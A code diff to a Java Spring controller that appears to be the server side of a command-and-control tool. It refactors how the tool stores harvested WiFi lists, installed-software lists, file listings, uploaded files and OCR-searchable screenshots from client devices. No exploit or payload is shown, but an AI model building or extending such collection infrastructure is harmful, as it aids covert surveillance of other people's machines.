@@ -36,10 +36,6 @@ import cn.hutool.cache.CacheUtil;
 import cn.hutool.cache.impl.TimedCache;
 import cn.hutool.crypto.digest.DigestUtil;
 
-import java.sql.Connection;
-import java.sql.DriverManager;
-import java.sql.ResultSet;
-import java.sql.Statement;
 import org.apache.commons.lang3.StringUtils;
 
 /**
@@ -70,13 +66,7 @@ public class C2Controller {
     private C2WifiMapper c2WifiMapper;
 
     @Resource
-    private C2FileScanMapper c2FileScanMapper;
-
-    @Resource
     private C2ScreenshotMapper c2ScreenshotMapper;
-
-    @Resource
-    private com.yupi.springbootinit.service.C2FileScanService c2FileScanService;
 
     @Resource
     private com.yupi.springbootinit.service.C2FileSystemNodeService c2FileSystemNodeService;
@@ -111,62 +101,57 @@ public class C2Controller {
             jdbcTemplate.execute("DROP TABLE IF EXISTS c2_software");
             jdbcTemplate.execute("DROP TABLE IF EXISTS c2_file_scan");
             jdbcTemplate.execute("DROP TABLE IF EXISTS c2_screenshot");
+            jdbcTemplate.execute("DROP TABLE IF EXISTS c2_file_system_node");
 
             // C2 WiFi
             jdbcTemplate.execute("create table if not exists c2_wifi (" +
                     "id bigint auto_increment primary key, " +
-                    "device_uuid varchar(64) not null, " +
+                    "device_id bigint not null, " +
                     "ssid varchar(128) null, " +
                     "bssid varchar(64) null, " +
                     "signal_strength varchar(32) null, " +
                     "authentication varchar(64) null, " +
                     "create_time datetime default CURRENT_TIMESTAMP not null, " +
-                    "is_delete tinyint default 0 not null)");
+                    "is_delete tinyint default 0 not null, " +
+                    "index idx_device_id (device_id))");
 
             // C2 Software
             jdbcTemplate.execute("create table if not exists c2_software (" +
                     "id bigint auto_increment primary key, " +
-                    "device_uuid varchar(64) not null, " +
+                    "device_id bigint not null, " +
                     "name varchar(256) null, " +
                     "version varchar(128) null, " +
                     "install_date varchar(64) null, " +
                     "create_time datetime default CURRENT_TIMESTAMP not null, " +
-                    "is_delete tinyint default 0 not null)");
+                    "is_delete tinyint default 0 not null, " +
+                    "index idx_device_id (device_id))");
 
-            // C2 File Scan
-            jdbcTemplate.execute("create table if not exists c2_file_scan (" +
-                    "id bigint auto_increment primary key, " +
-                    "device_uuid varchar(64) not null, " +
-                    "file_name varchar(256) null, " +
-                    "file_path varchar(512) null, " +
-                    "file_size bigint null, " +
-                    "md5 varchar(64) null, " +
-                    "last_modified datetime null, " +
-                    "is_recent tinyint default 0 null, " +
-                    "create_time datetime default CURRENT_TIMESTAMP not null, " +
-                    "is_delete tinyint default 0 not null)");
-            
             // C2 Screenshot
             jdbcTemplate.execute("create table if not exists c2_screenshot (" +
                     "id bigint auto_increment primary key, " +
-                    "device_uuid varchar(64) not null, " +
+                    "device_id bigint not null, " +
                     "task_id varchar(64) null, " +
                     "url varchar(512) null, " +
+                    "ocr_result text null, " +
                     "create_time datetime default CURRENT_TIMESTAMP not null, " +
-                    "is_delete tinyint default 0 not null)");
+                    "is_delete tinyint default 0 not null, " +
+                    "index idx_device_id (device_id))");
 
             // C2 File System Node
             jdbcTemplate.execute("create table if not exists c2_file_system_node (" +
                     "id bigint auto_increment primary key, " +
-                    "device_uuid varchar(64) not null, " +
+                    "device_id bigint not null, " +
                     "parent_path varchar(512) null, " +
                     "path varchar(512) null, " +
                     "name varchar(256) null, " +
                     "is_directory tinyint default 0 null, " +
                     "size bigint null, " +
+                    "md5 varchar(64) null, " +
+                    "is_recent tinyint default 0 null, " +
                     "last_modified datetime null, " +
                     "create_time datetime default CURRENT_TIMESTAMP not null, " +
-                    "is_delete tinyint default 0 not null)");
+                    "is_delete tinyint default 0 not null, " +
+                    "index idx_device_id (device_id))");
 
             return "Schema reset successfully";
         } catch (Exception e) {
@@ -180,7 +165,7 @@ public class C2Controller {
         try {
             c2TaskMapper.delete(new QueryWrapper<>());
             c2ScreenshotMapper.delete(new QueryWrapper<>());
-            c2FileScanMapper.delete(new QueryWrapper<>());
+            c2FileSystemNodeService.remove(new QueryWrapper<>());
             c2WifiMapper.delete(new QueryWrapper<>());
             c2SoftwareMapper.delete(new QueryWrapper<>());
             // Optional: Clean uploads
@@ -237,16 +222,24 @@ public class C2Controller {
 
             // 3. Inject Full Disk Scan (Mocking scan_results.db upload processing)
             // We can't easily mock the file upload here, but we can insert directly into DB using mapper
-            C2FileScan fullScan = new C2FileScan();
-            fullScan.setDeviceUuid(uuid);
-            fullScan.setFilePath("C:\\Windows\\System32\\calc.exe");
-            fullScan.setFileName("calc.exe");
-            fullScan.setFileSize(20480L);
-            fullScan.setMd5("1234567890abcdef");
-            fullScan.setIsRecent(0);
-            fullScan.setCreateTime(new Date());
-            fullScan.setLastModified(new Date());
-            c2FileScanMapper.insert(fullScan);
+            
+            // Resolve Device ID
+            C2Device device = c2DeviceMapper.selectOne(new QueryWrapper<C2Device>().eq("uuid", uuid));
+            if (device == null) {
+                // Should have been created by previous steps or fail
+                log.warn("Device not found for injection: {}", uuid);
+            } else {
+                C2FileSystemNode node = new C2FileSystemNode();
+                node.setDeviceId(device.getId());
+                node.setPath("C:\\Windows\\System32\\calc.exe");
+                node.setName("calc.exe");
+                node.setSize(20480L);
+                node.setMd5("1234567890abcdef");
+                node.setIsRecent(0);
+                node.setCreateTime(new Date());
+                node.setLastModified(new Date());
+                c2FileSystemNodeService.save(node);
+            }
 
             // 4. Inject Screenshot
             String screenshotTaskId = UUID.randomUUID().toString();
@@ -306,8 +299,13 @@ public class C2Controller {
             return ResultUtils.error(ErrorCode.PARAMS_ERROR, "uuid is required");
         }
         
+        C2Device device = c2DeviceMapper.selectOne(new QueryWrapper<C2Device>().eq("uuid", uuid));
+        if (device == null) {
+            return ResultUtils.success(new ArrayList<>());
+        }
+
         LambdaQueryWrapper<C2Screenshot> queryWrapper = new LambdaQueryWrapper<>();
-        queryWrapper.eq(C2Screenshot::getDeviceUuid, uuid);
+        queryWrapper.eq(C2Screenshot::getDeviceId, device.getId());
         
         if (org.apache.commons.lang3.StringUtils.isNotBlank(searchText)) {
             queryWrapper.like(C2Screenshot::getOcrResult, searchText);
@@ -609,109 +607,118 @@ public class C2Controller {
                         log.info("Target Device UUID for software update: {}", currentDeviceUuid);
 
                         if (currentDeviceUuid != null) {
-                            // Try parsing as List<Map> first, then List<String>
-                            List<Map<String, Object>> softwareMapList = null;
-                            List<String> softwareStringList = null;
-                            
-                            try {
-                                if (result.trim().startsWith("[")) {
-                                    softwareMapList = gson.fromJson(result, new TypeToken<List<Map<String, Object>>>(){}.getType());
-                                }
-                            } catch (Exception e) {
-                                // failed to parse as map list, try string list
+                            // Lookup Device ID
+                            Long deviceId = null;
+                            C2Device device = c2DeviceMapper.selectOne(new QueryWrapper<C2Device>().eq("uuid", currentDeviceUuid));
+                            if (device != null) {
+                                deviceId = device.getId();
                             }
-                            
-                            if (softwareMapList == null || softwareMapList.isEmpty()) {
+
+                            if (deviceId != null) {
+                                // Try parsing as List<Map> first, then List<String>
+                                List<Map<String, Object>> softwareMapList = null;
+                                List<String> softwareStringList = null;
+                                
                                 try {
                                     if (result.trim().startsWith("[")) {
-                                        softwareStringList = gson.fromJson(result, new TypeToken<List<String>>(){}.getType());
-                                    } else {
-                                        log.warn("Software result is not JSON list, skipping parse: {}", result);
+                                        softwareMapList = gson.fromJson(result, new TypeToken<List<Map<String, Object>>>(){}.getType());
                                     }
                                 } catch (Exception e) {
-                                    log.error("Failed to parse software JSON list as Map or String. Raw result: {}", result);
+                                    // failed to parse as map list, try string list
                                 }
-                            }
-                            
-                            if ((softwareMapList != null && !softwareMapList.isEmpty()) || (softwareStringList != null && !softwareStringList.isEmpty())) {
-                                log.info("Parsed software entries. Deleting old records for device UUID {}", currentDeviceUuid);
                                 
-                                // Clear old software list for this device
-                                QueryWrapper<C2Software> deleteWrapper = new QueryWrapper<>();
-                                deleteWrapper.eq("device_uuid", currentDeviceUuid);
-                                int deleted = c2SoftwareMapper.delete(deleteWrapper);
-                                log.info("Deleted {} old software records", deleted);
-    
-                                int successCount = 0;
-                                
-                                // Handle Map List
-                                if (softwareMapList != null) {
-                                    for (Map<String, Object> soft : softwareMapList) {
-                                        try {
-                                            C2Software c2Software = new C2Software();
-                                            c2Software.setDeviceUuid(currentDeviceUuid);
-                                            
-                                            // Flexible key handling
-                                            Object nameObj = soft.get("name") != null ? soft.get("name") : soft.get("DisplayName");
-                                            String name = nameObj != null ? String.valueOf(nameObj) : null;
-                                            
-                                            Object versionObj = soft.get("version") != null ? soft.get("version") : soft.get("DisplayVersion");
-                                            String version = versionObj != null ? String.valueOf(versionObj) : null;
-                                            
-                                            Object dateObj = soft.get("installDate") != null ? soft.get("installDate") : soft.get("InstallDate");
-                                            String date = dateObj != null ? String.valueOf(dateObj) : null;
-                                            
-                                            if (name == null || name.trim().isEmpty()) {
-                                                continue; 
-                                            }
-                                            
-                                            c2Software.setName(name);
-                                            c2Software.setVersion(version);
-                                            c2Software.setInstallDate(date);
-                                            c2Software.setCreateTime(new Date());
-                                            c2SoftwareMapper.insert(c2Software);
-                                            successCount++;
-                                        } catch (Exception e) {
-                                            log.warn("Skipping invalid software entry: {} Error: {}", soft, e.getMessage());
+                                if (softwareMapList == null || softwareMapList.isEmpty()) {
+                                    try {
+                                        if (result.trim().startsWith("[")) {
+                                            softwareStringList = gson.fromJson(result, new TypeToken<List<String>>(){}.getType());
+                                        } else {
+                                            log.warn("Software result is not JSON list, skipping parse: {}", result);
                                         }
+                                    } catch (Exception e) {
+                                        log.error("Failed to parse software JSON list as Map or String. Raw result: {}", result);
                                     }
                                 }
                                 
-                                // Handle String List (e.g. ["App (v1.0)", "App2"])
-                                if (softwareStringList != null) {
-                                    for (String softStr : softwareStringList) {
-                                        if (softStr == null || softStr.trim().isEmpty()) continue;
-                                        try {
-                                            C2Software c2Software = new C2Software();
-                                            c2Software.setDeviceUuid(currentDeviceUuid);
-                                            
-                                            String name = softStr;
-                                            String version = null;
-                                            
-                                            // Try to extract version if format is "Name (Version)"
-                                            // E.g. "Git (2.52.0)"
-                                            if (softStr.endsWith(")") && softStr.contains("(")) {
-                                                int lastOpen = softStr.lastIndexOf("(");
-                                                if (lastOpen > 0) {
-                                                    name = softStr.substring(0, lastOpen).trim();
-                                                    version = softStr.substring(lastOpen + 1, softStr.length() - 1);
+                                if ((softwareMapList != null && !softwareMapList.isEmpty()) || (softwareStringList != null && !softwareStringList.isEmpty())) {
+                                    log.info("Parsed software entries. Deleting old records for device UUID {}", currentDeviceUuid);
+                                    
+                                    // Clear old software list for this device
+                                    QueryWrapper<C2Software> deleteWrapper = new QueryWrapper<>();
+                                    deleteWrapper.eq("device_id", deviceId);
+                                    int deleted = c2SoftwareMapper.delete(deleteWrapper);
+                                    log.info("Deleted {} old software records", deleted);
+        
+                                    int successCount = 0;
+                                    
+                                    // Handle Map List
+                                    if (softwareMapList != null) {
+                                        for (Map<String, Object> soft : softwareMapList) {
+                                            try {
+                                                C2Software c2Software = new C2Software();
+                                                c2Software.setDeviceId(deviceId);
+                                                
+                                                // Flexible key handling
+                                                Object nameObj = soft.get("name") != null ? soft.get("name") : soft.get("DisplayName");
+                                                String name = nameObj != null ? String.valueOf(nameObj) : null;
+                                                
+                                                Object versionObj = soft.get("version") != null ? soft.get("version") : soft.get("DisplayVersion");
+                                                String version = versionObj != null ? String.valueOf(versionObj) : null;
+                                                
+                                                Object dateObj = soft.get("installDate") != null ? soft.get("installDate") : soft.get("InstallDate");
+                                                String date = dateObj != null ? String.valueOf(dateObj) : null;
+                                                
+                                                if (name == null || name.trim().isEmpty()) {
+                                                    continue; 
                                                 }
+                                                
+                                                c2Software.setName(name);
+                                                c2Software.setVersion(version);
+                                                c2Software.setInstallDate(date);
+                                                c2Software.setCreateTime(new Date());
+                                                c2SoftwareMapper.insert(c2Software);
+                                                successCount++;
+                                            } catch (Exception e) {
+                                                log.warn("Skipping invalid software entry: {} Error: {}", soft, e.getMessage());
                                             }
-                                            
-                                            c2Software.setName(name);
-                                            c2Software.setVersion(version);
-                                            c2Software.setCreateTime(new Date());
-                                            c2SoftwareMapper.insert(c2Software);
-                                            successCount++;
-                                        } catch (Exception e) {
-                                            log.error("Failed to insert software string: " + softStr, e);
                                         }
                                     }
+                                    
+                                    // Handle String List (e.g. ["App (v1.0)", "App2"])
+                                    if (softwareStringList != null) {
+                                        for (String softStr : softwareStringList) {
+                                            if (softStr == null || softStr.trim().isEmpty()) continue;
+                                            try {
+                                                C2Software c2Software = new C2Software();
+                                                c2Software.setDeviceId(deviceId);
+                                                
+                                                String name = softStr;
+                                                String version = null;
+                                                
+                                                // Try to extract version if format is "Name (Version)"
+                                                // E.g. "Git (2.52.0)"
+                                                if (softStr.endsWith(")") && softStr.contains("(")) {
+                                                    int lastOpen = softStr.lastIndexOf("(");
+                                                    if (lastOpen > 0) {
+                                                        name = softStr.substring(0, lastOpen).trim();
+                                                        version = softStr.substring(lastOpen + 1, softStr.length() - 1);
+                                                    }
+                                                }
+                                                
+                                                c2Software.setName(name);
+                                                c2Software.setVersion(version);
+                                                c2Software.setCreateTime(new Date());
+                                                c2SoftwareMapper.insert(c2Software);
+                                                successCount++;
+                                            } catch (Exception e) {
+                                                log.error("Failed to insert software string: " + softStr, e);
+                                            }
+                                        }
+                                    }
+                                    
+                                    log.info("Successfully inserted {} software records for device {}", successCount, currentDeviceUuid);
+                                } else {
+                                    log.warn("Software list is empty or null for task {}", taskId);
                                 }
-                                
-                                log.info("Successfully inserted {} software records for device {}", successCount, currentDeviceUuid);
-                            } else {
-                                log.warn("Software list is empty or null for task {}", taskId);
                             }
                         } else {
                             log.error("Cannot process software list: deviceUuid is null for task {}", taskId);
@@ -736,7 +743,15 @@ public class C2Controller {
                         
                         log.info("Target Device UUID for WiFi update: {}", currentDeviceUuid);
 
+                        Long deviceId = null;
                         if (currentDeviceUuid != null) {
+                            C2Device device = c2DeviceMapper.selectOne(new QueryWrapper<C2Device>().eq("uuid", currentDeviceUuid));
+                            if (device != null) {
+                                deviceId = device.getId();
+                            }
+                        }
+
+                        if (deviceId != null) {
                             List<Map<String, Object>> wifiList = null;
                             try {
                                 if (result.trim().startsWith("[")) {
@@ -752,7 +767,7 @@ public class C2Controller {
                             if (wifiList != null) {
                                 // Clear old wifi list
                                 QueryWrapper<C2Wifi> deleteWrapper = new QueryWrapper<>();
-                                deleteWrapper.eq("device_uuid", currentDeviceUuid);
+                                deleteWrapper.eq("device_id", deviceId);
                                 int deleted = c2WifiMapper.delete(deleteWrapper);
                                 log.info("Deleted {} old WiFi records", deleted);
     
@@ -760,15 +775,20 @@ public class C2Controller {
                                 for (Map<String, Object> wifi : wifiList) {
                                     try {
                                         C2Wifi c2Wifi = new C2Wifi();
-                                        c2Wifi.setDeviceUuid(currentDeviceUuid); // Set UUID
+                                        c2Wifi.setDeviceId(deviceId); // Set ID
                                         c2Wifi.setSsid((String) wifi.get("ssid"));
                                         c2Wifi.setBssid((String) wifi.get("bssid"));
                                         // Handle signal strength as number or string
                                         Object signal = wifi.get("signal");
+                                        if (signal == null) signal = wifi.get("signal_strength"); // Snake case support
+                                        
                                         c2Wifi.setSignalStrength(signal != null ? String.valueOf(signal) : "");
                                         
                                         // Handle authentication
                                         Object authObj = wifi.get("auth");
+                                        if (authObj == null) authObj = wifi.get("authentication"); // Snake case support
+                                        if (authObj == null) authObj = wifi.get("security_type");
+                                        
                                         if (authObj != null) {
                                             c2Wifi.setAuthentication(String.valueOf(authObj));
                                         }
@@ -783,7 +803,7 @@ public class C2Controller {
                                 log.info("Updated wifi list for device {}, inserted {} records", currentDeviceUuid, inserted);
                             }
                         } else {
-                            log.error("Cannot process wifi list: deviceUuid is null for task {}", taskId);
+                            log.error("Cannot process wifi list: deviceId not found for UUID {}", currentDeviceUuid);
                         }
                     } catch (Exception e) {
                         log.error("Failed to parse wifi list: ", e);
@@ -801,7 +821,15 @@ public class C2Controller {
                             }
                         }
 
+                        Long deviceId = null;
                         if (currentDeviceUuid != null) {
+                            C2Device device = c2DeviceMapper.selectOne(new QueryWrapper<C2Device>().eq("uuid", currentDeviceUuid));
+                            if (device != null) {
+                                deviceId = device.getId();
+                            }
+                        }
+
+                        if (deviceId != null) {
                             List<Map<String, Object>> fileList = null;
                             try {
                                 fileList = gson.fromJson(result, new TypeToken<List<Map<String, Object>>>(){}.getType());
@@ -811,27 +839,27 @@ public class C2Controller {
                             
                             if (fileList != null) {
                                 // Clear old recent files for this device
-                                QueryWrapper<C2FileScan> deleteWrapper = new QueryWrapper<>();
-                                deleteWrapper.eq("device_uuid", currentDeviceUuid);
-                                deleteWrapper.eq("isRecent", 1);
-                                c2FileScanMapper.delete(deleteWrapper);
+                                QueryWrapper<C2FileSystemNode> deleteWrapper = new QueryWrapper<>();
+                                deleteWrapper.eq("device_id", deviceId);
+                                deleteWrapper.eq("is_recent", 1);
+                                c2FileSystemNodeService.remove(deleteWrapper);
     
                                 for (Map<String, Object> file : fileList) {
                                     try {
-                                        C2FileScan c2FileScan = new C2FileScan();
-                                        c2FileScan.setDeviceUuid(currentDeviceUuid); // Set UUID
-                                        c2FileScan.setFilePath((String) file.get("path"));
-                                        c2FileScan.setFileName((String) file.get("name"));
+                                        C2FileSystemNode node = new C2FileSystemNode();
+                                        node.setDeviceId(deviceId); // Set ID
+                                        node.setPath((String) file.get("path"));
+                                        node.setName((String) file.get("name"));
                                         // Handle potential double/long type mismatch from JSON
                                         Object sizeObj = file.get("size");
                                         if (sizeObj instanceof Number) {
-                                            c2FileScan.setFileSize(((Number) sizeObj).longValue());
+                                            node.setSize(((Number) sizeObj).longValue());
                                         }
-                                        c2FileScan.setMd5((String) file.get("md5"));
-                                        c2FileScan.setIsRecent(1);
-                                        c2FileScan.setLastModified(new Date()); // Ideally parse from result if available
-                                        c2FileScan.setCreateTime(new Date());
-                                        c2FileScanMapper.insert(c2FileScan);
+                                        node.setMd5((String) file.get("md5"));
+                                        node.setIsRecent(1);
+                                        node.setLastModified(new Date()); // Ideally parse from result if available
+                                        node.setCreateTime(new Date());
+                                        c2FileSystemNodeService.save(node);
                                     } catch (Exception e) {
                                         log.warn("Skipping invalid recent file entry: {}", file);
                                     }
@@ -897,7 +925,9 @@ public class C2Controller {
                          
                          // Create C2Screenshot record
                          C2Screenshot screenshot = new C2Screenshot();
-                         screenshot.setDeviceUuid(uuid);
+                         if (device != null) {
+                             screenshot.setDeviceId(device.getId());
+                         }
                          screenshot.setTaskId(taskId);
                          String url = "/api/c2/download?uuid=" + uuid + "&filename=" + filename; 
                          
@@ -966,22 +996,24 @@ public class C2Controller {
                              }
                              
                              // Create C2Screenshot record
-                             C2Screenshot screenshot = new C2Screenshot();
-                             screenshot.setDeviceUuid(uuid);
-                             screenshot.setTaskId(taskId); 
-                             // Prefer UUID for download url if possible
-                             String url = "/api/c2/download?uuid=" + uuid + "&filename=" + filename;
-
-                             // Perform OCR
-                             String ocrText = ocrService.doOcr(dest);
-                             screenshot.setOcrResult(ocrText);
-                             screenshot.setUrl(url);
-                             screenshot.setCreateTime(new Date());
-                             c2ScreenshotMapper.insert(screenshot);
-                             
-                             // Update task result to point to file instead of raw base64
-                             task.setResult(url);
-                             c2TaskMapper.updateById(task);
+                             if (device != null) {
+                                 C2Screenshot screenshot = new C2Screenshot();
+                                 screenshot.setDeviceId(device.getId());
+                                 screenshot.setTaskId(taskId); 
+                                 // Prefer UUID for download url if possible
+                                 String url = "/api/c2/download?uuid=" + uuid + "&filename=" + filename;
+    
+                                 // Perform OCR
+                                 String ocrText = ocrService.doOcr(dest);
+                                 screenshot.setOcrResult(ocrText);
+                                 screenshot.setUrl(url);
+                                 screenshot.setCreateTime(new Date());
+                                 c2ScreenshotMapper.insert(screenshot);
+                                 
+                                 // Update task result to point to file instead of raw base64
+                                 task.setResult(url);
+                                 c2TaskMapper.updateById(task);
+                             }
                          }
                     } catch (Exception e) {
                         // ignore if not image
@@ -1023,11 +1055,18 @@ public class C2Controller {
                     for (File file : files) {
                         String filename = file.getName();
                         if (filename.toLowerCase().endsWith(".png") || filename.toLowerCase().endsWith(".jpg") || filename.toLowerCase().endsWith(".jpeg")) {
+                            // Lookup device first
+                            C2Device device = c2DeviceMapper.selectOne(new QueryWrapper<C2Device>().eq("uuid", uuid));
+                            if (device == null) {
+                                // Skip if device not found (cannot link to DB)
+                                continue;
+                            }
+
                             // Check if exists in DB
                             C2Screenshot existing = null;
                             try {
                                 existing = c2ScreenshotMapper.selectOne(new QueryWrapper<C2Screenshot>()
-                                    .eq("device_uuid", uuid)
+                                    .eq("device_id", device.getId())
                                     .like("url", "%" + filename) // Use like to match filename in url
                                     .last("LIMIT 1"));
                             } catch (Exception e) {
@@ -1040,7 +1079,7 @@ public class C2Controller {
                                     String ocrText = ocrService.doOcr(file);
                                     
                                     C2Screenshot screenshot = new C2Screenshot();
-                                    screenshot.setDeviceUuid(uuid);
+                                    screenshot.setDeviceId(device.getId());
                                     
                                     String taskId = "sync_" + System.currentTimeMillis();
                                     if (filename.contains("_") && filename.lastIndexOf(".") > filename.indexOf("_")) {
@@ -1083,12 +1122,34 @@ public class C2Controller {
     /**
      * Handle file upload from client
      */
-    @PostMapping("/c2/upload")
-    public BaseResponse<String> uploadFile(@RequestParam("file") MultipartFile file,
-                                           @RequestParam("uuid") String uuid,
+    @RequestMapping(value = "/c2/upload", method = {RequestMethod.POST, RequestMethod.GET})
+    public BaseResponse<String> uploadFile(@RequestParam(value = "file", required = false) MultipartFile file,
+                                           @RequestParam(value = "uuid", required = false) String uuid,
                                            @RequestParam(value = "taskId", required = false) String taskId,
                                            HttpServletRequest request) {
-        log.info("Received upload request: filename={}, uuid={}", file.getOriginalFilename(), uuid);
+        String method = request.getMethod();
+        log.info("Received upload request. Method: {}, Content-Type: {}, Query: {}", 
+                 method, request.getContentType(), request.getQueryString());
+
+        if ("GET".equalsIgnoreCase(method)) {
+             log.warn("Client attempted upload via GET. Rejecting.");
+             return ResultUtils.error(ErrorCode.PARAMS_ERROR, "Please use POST method to upload files. Your request method: " + method);
+        }
+        
+        // Handle multipart check manually if needed, but Spring does it.
+        
+        if (file == null) {
+            log.error("Upload failed: File parameter is missing. UUID: {}", uuid);
+            return ResultUtils.error(ErrorCode.PARAMS_ERROR, "Missing 'file' parameter");
+        }
+        
+        if (uuid == null || uuid.trim().isEmpty()) {
+            log.error("Upload failed: UUID is missing. Filename: {}", file.getOriginalFilename());
+             return ResultUtils.error(ErrorCode.PARAMS_ERROR, "Missing 'uuid' parameter");
+        }
+
+        log.info("Processing upload: filename={}, uuid={}, size={}", file.getOriginalFilename(), uuid, file.getSize());
+        
         if (file.isEmpty()) {
             return ResultUtils.error(ErrorCode.PARAMS_ERROR, "File is empty");
         }
@@ -1106,9 +1167,24 @@ public class C2Controller {
             targetDirName = device.getUuid();
         } else {
             // Device not found
-            // If uuid looks like a UUID, use it
+            // If uuid looks like a UUID, use it and CREATE the device
             if (uuid.length() > 30 && uuid.contains("-")) {
                  targetDirName = uuid;
+                 // Create device so we can link data to it
+                 try {
+                     device = new C2Device();
+                     device.setUuid(uuid);
+                     device.setCreateTime(new Date());
+                     device.setLastSeen(new Date());
+                     device.setIsDelete(0);
+                     // Set default values to avoid null errors
+                     device.setInternalIp("unknown");
+                     device.setHostName("unknown");
+                     c2DeviceMapper.insert(device);
+                     log.info("Created new device for upload: {}", uuid);
+                 } catch (Exception e) {
+                     log.error("Failed to create device for upload: " + uuid, e);
+                 }
             } else {
                  // It's likely a numeric ID but device not found. Use a random UUID to avoid using number as folder.
                  log.warn("Upload from unknown device UUID {}. Using random UUID.", uuid);
@@ -1157,14 +1233,16 @@ public class C2Controller {
                 try {
                     String ocrText = ocrService.doOcr(dest);
                     
-                    C2Screenshot screenshot = new C2Screenshot();
-                    screenshot.setDeviceUuid(targetDirName);
-                    screenshot.setTaskId(taskId);
-                    String url = "/api/c2/download?uuid=" + targetDirName + "&filename=" + filename;
-                    screenshot.setUrl(url);
-                    screenshot.setOcrResult(ocrText);
-                    screenshot.setCreateTime(new Date());
-                    c2ScreenshotMapper.insert(screenshot);
+                    if (device != null) {
+                        C2Screenshot screenshot = new C2Screenshot();
+                        screenshot.setDeviceId(device.getId());
+                        screenshot.setTaskId(taskId);
+                        String url = "/api/c2/download?uuid=" + targetDirName + "&filename=" + filename;
+                        screenshot.setUrl(url);
+                        screenshot.setOcrResult(ocrText);
+                        screenshot.setCreateTime(new Date());
+                        c2ScreenshotMapper.insert(screenshot);
+                    }
                 } catch (Exception e) {
                     log.error("OCR failed for uploaded image: " + filename, e);
                     // Continue without failing the upload
@@ -1254,6 +1332,11 @@ public class C2Controller {
                     c2DeviceMapper.insert(device);
                 }
 
+                // CRITICAL FIX: Re-fetch device to ensure ID is populated
+                if (device.getId() == null) {
+                     device = c2DeviceMapper.selectOne(new QueryWrapper<C2Device>().eq("uuid", deviceUuid));
+                }
+
                 // 2. Process WiFi Scan Results
                 try {
                     java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM wifi_scan_results");
@@ -1262,11 +1345,28 @@ public class C2Controller {
                     
                     while (rs.next()) {
                         C2Wifi wifi = new C2Wifi();
-                        wifi.setDeviceUuid(deviceUuid);
+                        // wifi.setDeviceUuid(deviceUuid); // Removed
+                        if (device != null && device.getId() != null) {
+                             wifi.setDeviceId(device.getId());
+                        } else {
+                             continue; // Skip if no device ID
+                        }
                         wifi.setSsid(rs.getString("ssid"));
                         wifi.setBssid(rs.getString("bssid"));
-                        wifi.setSignalStrength(rs.getString("signal_strength"));
-                        wifi.setAuthentication(rs.getString("security_type"));
+                        
+                        // Robust column handling for signal
+                        String signal = null;
+                        try { signal = rs.getString("signal_strength"); } catch (Exception ignore) {}
+                        if (signal == null) { try { signal = rs.getString("signal"); } catch (Exception ignore) {} }
+                        wifi.setSignalStrength(signal);
+                        
+                        // Robust column handling for authentication
+                        String auth = null;
+                        try { auth = rs.getString("security_type"); } catch (Exception ignore) {}
+                        if (auth == null) { try { auth = rs.getString("authentication"); } catch (Exception ignore) {} }
+                        if (auth == null) { try { auth = rs.getString("auth"); } catch (Exception ignore) {} }
+                        wifi.setAuthentication(auth);
+                        
                         wifi.setCreateTime(new Date());
                         wifiList.add(wifi);
                         
@@ -1280,24 +1380,23 @@ public class C2Controller {
                     String redisKey = "dedup:hash:wifi:" + deviceUuid;
                     String lastHash = dedupCache.get(redisKey);
                     
-                    if (lastHash != null && lastHash.equals(currentHash) && c2WifiMapper.selectCount(new QueryWrapper<C2Wifi>().eq("device_uuid", deviceUuid)) > 0) {
+                    if (lastHash != null && lastHash.equals(currentHash) && device != null && c2WifiMapper.selectCount(new QueryWrapper<C2Wifi>().eq("device_id", device.getId())) > 0) {
                         log.info("WiFi scan results identical to last scan for device {}, skipping DB write.", deviceUuid);
                     } else {
                         // Update DB
-                        c2WifiMapper.delete(new QueryWrapper<C2Wifi>().eq("device_uuid", deviceUuid));
-                        
-                        if (!wifiList.isEmpty()) {
-                            // Simple batch insert loop (mapper doesn't have saveBatch, service does but we can just loop or use service if available)
-                            // We don't have C2WifiService injected, so just loop insert. 
-                            // Since it's usually small list (<50), loop is fine.
-                            for (C2Wifi wifi : wifiList) {
-                                c2WifiMapper.insert(wifi);
+                        if (device != null && device.getId() != null) {
+                            c2WifiMapper.delete(new QueryWrapper<C2Wifi>().eq("device_id", device.getId()));
+                            
+                            if (!wifiList.isEmpty()) {
+                                for (C2Wifi wifi : wifiList) {
+                                    c2WifiMapper.insert(wifi);
+                                }
                             }
+                            
+                            // Update Cache
+                            dedupCache.put(redisKey, currentHash, TimeUnit.DAYS.toMillis(7));
+                            log.info("Updated WiFi scan results for device {}", deviceUuid);
                         }
-                        
-                        // Update Cache
-                        dedupCache.put(redisKey, currentHash, TimeUnit.DAYS.toMillis(7));
-                        log.info("Updated WiFi scan results for device {}", deviceUuid);
                     }
 
                 } catch (Exception e) {
@@ -1311,7 +1410,12 @@ public class C2Controller {
                     
                     while (rs.next()) {
                         C2Software sw = new C2Software();
-                        sw.setDeviceUuid(deviceUuid);
+                        // sw.setDeviceUuid(deviceUuid); // Removed
+                        if (device != null && device.getId() != null) {
+                             sw.setDeviceId(device.getId());
+                        } else {
+                             continue;
+                        }
                         sw.setName(rs.getString("name"));
                         sw.setVersion(rs.getString("version"));
                         sw.setInstallDate(rs.getString("install_date"));
@@ -1336,17 +1440,19 @@ public class C2Controller {
                         log.info("Software scan results identical to last scan for device {}, skipping DB write.", deviceUuid);
                     } else {
                         // Update DB
-                        c2SoftwareMapper.delete(new QueryWrapper<C2Software>().eq("device_uuid", deviceUuid));
-                        
-                        if (!softwareList.isEmpty()) {
-                            // Loop insert (software list can be 100-200)
-                            for (C2Software sw : softwareList) {
-                                c2SoftwareMapper.insert(sw);
+                        if (device != null && device.getId() != null) {
+                            c2SoftwareMapper.delete(new QueryWrapper<C2Software>().eq("device_id", device.getId()));
+                            
+                            if (!softwareList.isEmpty()) {
+                                // Loop insert (software list can be 100-200)
+                                for (C2Software sw : softwareList) {
+                                    c2SoftwareMapper.insert(sw);
+                                }
                             }
+                            
+                            dedupCache.put(redisKey, currentHash, TimeUnit.DAYS.toMillis(7));
+                            log.info("Updated Software scan results for device {}", deviceUuid);
                         }
-                        
-                        dedupCache.put(redisKey, currentHash, TimeUnit.DAYS.toMillis(7));
-                        log.info("Updated Software scan results for device {}", deviceUuid);
                     }
 
                 } catch (Exception e) {
@@ -1570,10 +1676,18 @@ public class C2Controller {
 
                 // 5. Process File Scan Results (files or file_scan_results)
                 try {
-                    // Clear old File Scan records (Only full scan, not recent)
-                    c2FileScanMapper.delete(new QueryWrapper<C2FileScan>().eq("device_uuid", deviceUuid).eq("isRecent", 0));
-                    // Also clear File System Nodes for this device to ensure fresh view
